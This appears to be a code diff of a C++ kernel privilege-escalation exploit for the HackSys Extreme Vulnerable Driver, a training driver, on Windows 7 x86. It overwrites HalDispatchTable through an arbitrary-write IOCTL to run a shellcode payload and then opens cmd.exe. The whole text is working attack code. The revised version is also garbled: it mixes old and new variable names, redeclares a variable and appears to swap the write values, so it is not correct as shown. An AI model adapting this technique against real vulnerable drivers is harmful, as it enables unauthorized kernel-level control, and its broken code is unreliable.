@@ -1,6 +1,3 @@
-// HEVD-ArbitraryOverwritex86win7.cpp : Defines the entry point for the console application.
-//
-
 #include "stdafx.h"
 #include <Windows.h>
 #include <string.h>
@@ -9,14 +6,21 @@
 #include <stdint.h>
 #include <malloc.h>
 
-typedef NTSTATUS(__stdcall *_NtQueryIntervalProfile)(
+typedef NTSTATUS(__stdcall *pNtQueryIntervalProfile)(
 	ULONG ProfileSource,
 	PULONG Interval
 );
 
+typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
+		SYSTEM_INFORMATION_CLASS SystemInformationClass,
+		PVOID SystemInformation,
+		ULONG SystemInformationLength,
+		PULONG ReturnLength
+);
+
 #pragma comment(lib,"ntdll.lib")
 
-FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
+FARPROC GetAddress(LPCSTR Sym)
 {
 	typedef enum _SYSTEM_INFORMATION_CLASS {
 		SystemBasicInformation = 0,
@@ -56,72 +60,44 @@ FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
 		PULONG ReturnLength
 	);
 
-	DWORD len;
-	PSYSTEM_MODULE_INFORMATION ModuleInfo;
-	LPVOID kernelBase = NULL;
-	PUCHAR kernelImage = NULL;
-	HMODULE hUserSpaceKernel;
-	LPCSTR lpKernelName = NULL;
-	FARPROC pUserKernelSymbol = NULL;
-	FARPROC pLiveFunctionAddress = NULL;
+	DWORD l;
+	PSYSTEM_MODULE_INFORMATION Mi;
+	LPVOID kBase = NULL;
+	PUCHAR kImage = NULL;
+	HMODULE UKrnl;
+	FARPROC KSymb = NULL;
+	FARPROC Add = NULL;
+	LPCSTR KName = NULL;
 
 
-	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
-		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
-	if (NtQuerySystemInformation == NULL) {
-		return NULL;
-	}
+	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
 
-	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
+	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &l);
 	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
 		NULL, len, MEM_COMMIT | MEM_RESERVE,
 		PAGE_READWRITE
 	);
-	if (!ModuleInfo)
-	{
-		return NULL;
-	}
 
-	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
+	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, l, &l);
 
-	kernelBase = ModuleInfo->Module[0].ImageBase;
-	kernelImage = ModuleInfo->Module[0].FullPathName;
+	kBase = ModuleInfo->Module[0].ImageBase;
+	kImage = ModuleInfo->Module[0].FullPathName;
 
-	wprintf(L"Ntoskrnl Base Address is at: 0x%p \n", kernelBase);
+	KName = (LPCSTR)(Mi->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName);
 
-	/* Find exported Kernel Functions */
+	UKrnl = LoadLibraryExA(lpKernelName, 0, 0);
 
-	lpKernelName = (LPCSTR)(ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName);
+	KSym = GetProcAddress(Ukrnl, lpSymbolName);
+	Add = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)UKrnl + (PUCHAR)kBase);
 
-	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
-	if (hUserSpaceKernel == NULL)
-	{
-		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
-		printf("error load library");
-		return NULL;
-	}
+	FreeLibrary(UKrnl);
+	VirtualFree(Mi, 0, MEM_RELEASE);
 
-	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
-	if (pUserKernelSymbol == NULL)
-	{
-		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
-		printf("error load library");
-		return NULL;
-	}
-
-	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);
-
-	FreeLibrary(hUserSpaceKernel);
-	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
-
-	return pLiveFunctionAddress;
+	return Add;
 }
 
-#define offset 2080 
-
 #define ioctl CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
-
-const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
 
 int main()
 {
@@ -153,54 +129,37 @@ int main()
 		return -1;
 	}
 	LPVOID payload_ptr = NULL;
-	printf("device Handle obtained at: 0x%p\n", &dev);
-	LPCSTR lpWriteTargetName = "HalDispatchTable";
-	FARPROC fpWriteTarget = NULL;
-	LPVOID lpWriteTargetAddress = NULL;
-	LPVOID lpvPayload = VirtualAlloc(
+	LPCSTR Hal = "HalDispatchTable";
+	FARPROC Where = NULL;
+	LPVOID TargetAddress = NULL;
+	LPVOID pl = VirtualAlloc(
 		0,
 		sizeof(win7x86pl),
 		MEM_RESERVE | MEM_COMMIT,
 		PAGE_EXECUTE_READWRITE
 	);
-	printf("allocated payload placed at: 0x%p\n", &lpvPayload);
-	memcpy(lpvPayload, win7x86pl, sizeof(win7x86pl));
-	LPVOID lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
-	lpSourceTargetAddress = &lpvPayload;
-	fpWriteTarget = KernelSymbolInfo(lpWriteTargetName);
-	if (fpWriteTarget == NULL)
-	{
-		wprintf(L" -> Unable to find memory address!\n\n");
-		CloseHandle(dev);
-		exit(-1);
-	}
-	lpWriteTargetAddress = (LPVOID)((ULONG)fpWriteTarget + 0x4);
-	printf("HalDispatchTable pointer address for overwrite: 0x%p\n", &lpWriteTargetAddress);
-	auto chOverwriteBuffer = (PUCHAR)malloc(sizeof(PUCHAR) * 2);
-	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, 4);
-	memcpy(chOverwriteBuffer + 4, &lpWriteTargetAddress, 4);
-	printf("Sending ioctl....\n");
-	DWORD junk = 0;                   
+	memcpy(pl, win7x86pl, sizeof(win7x86pl));
+	LPVOID TargetAddress = (LPVOID)malloc(sizeof(LPVOID));
+	TargetAddress = &pl;
+	Where = GetAddress(Hal);
+	Write = (LPVOID)((ULONG)TargetAddress + 0x4);
+	auto Buff = (PUCHAR)malloc(sizeof(PUCHAR) * 2);
+	memcpy(Buff, &Write, 4);
+	memcpy(Buff + 4, &Where, 4);
+	DWORD u = 0;                   
 
 	auto bResult = DeviceIoControl(
 		dev,	
 		0x22200B,			
 		chOverwriteBuffer, 8,		
 		NULL, 0,		
-		&junk,			
+		&u,			
 		(LPOVERLAPPED)NULL
 	);	
 
-	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)
+	pNtQueryIntervalProfile NtQueryIntervalProfile = (pNtQueryIntervalProfile)
 		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
-	if (NtQueryIntervalProfile == NULL) {
-		printf("error locating QueryIntervalProfile");
-		return NULL;
-	}
-
-	printf("Calling NtQueryIntervalProfile...\n\n\n");
-	NtQueryIntervalProfile(0xa77b, &junk);
-	
+	NtQueryIntervalProfile(0xa77b, &u);
 	system("cmd.exe");
 	CloseHandle(dev);
 	system("pause");
